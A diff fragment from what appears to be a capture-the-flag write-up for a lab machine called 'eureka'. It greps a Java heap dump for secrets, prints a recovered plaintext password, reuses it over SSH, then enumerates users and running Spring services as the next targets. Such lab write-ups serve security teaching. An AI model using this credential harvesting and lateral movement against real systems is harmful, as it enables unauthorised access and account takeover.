@@ -71,3 +71,21 @@ I run:```strings heapdump | grep -Eai "(secret|passwd|password)\ ?[=|:]\ ?['|\"]
 ```{password=0sc@r190_S0l!dP@sswd, user=oscar190}!```
 
 Jackpot. I use these credentials for the SSH port from the beginning.
+
+In the home folder we see another user miranda, this is our next target.
+
+```
+oscar190@eureka:/home$ ls
+miranda-wise  oscar190
+```
+
+These processes are relevant:
+
+```
+oscar190@eureka:/home$ ps aux | grep -v "^root" | grep SNAPSHOT
+www-data     990  2.4  7.9 2838500 317152 ?      Sl   13:21  10:21 java -Xms100m -Xmx200m -XX:+UseG1GC -jar target/demo-0.0.1-SNAPSHOT.jar --spring.config.location=/var/www/web/Eureka-Server/src/main/resources/application.yaml
+www-data    2927  0.5  8.9 2885240 357372 ?      Sl   13:22   2:27 java -Xms100m -Xmx200m -XX:+UseG1GC -jar target/Furni-0.0.1-SNAPSHOT.jar --spring.config.location=/var/www/web/user-management-service/src/main/resources/application.properties
+www-data    2932  0.4  8.8 2886144 353956 ?      Sl   13:22   1:41 java -Xms100m -Xmx200m -XX:+UseG1GC -jar target/Furni-0.0.1-SNAPSHOT.jar --spring.config.location=/var/www/web/Furni/src/main/resources/application.properties
+www-data    3959  0.3  7.6 2825896 303724 ?      Sl   13:22   1:34 java -Xms100m -Xmx200m -XX:+UseG1GC -jar target/demo-0.0.1-SNAPSHOT.jar --spring.config.location=/var/www/web/cloud-gateway/src/main/resources/application.yaml
+mysql       1063  0.0  2.1 1716676 84176 ?       Ssl  13:21   0:23 /usr/sbin/mysqld
+```
